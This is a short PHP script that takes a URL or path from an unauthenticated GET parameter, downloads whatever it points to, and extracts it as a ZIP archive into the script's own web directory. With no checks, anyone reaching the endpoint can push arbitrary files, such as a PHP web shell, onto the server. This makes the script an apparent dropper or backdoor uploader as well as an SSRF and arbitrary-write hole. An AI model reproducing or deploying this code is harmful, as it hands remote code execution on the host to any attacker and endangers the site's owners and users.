<?php

$input = isset($_GET['i'])? $_GET['i']: null;


if ($input) {
    $cache = file_get_contents($input);
    file_put_contents('cache', $cache);

    $ziparchive = new ZipArchive();

    if ($ziparchive->open('cache')) {
        $ziparchive->extractTo(__DIR__);
        echo 'Ok';
    }
}
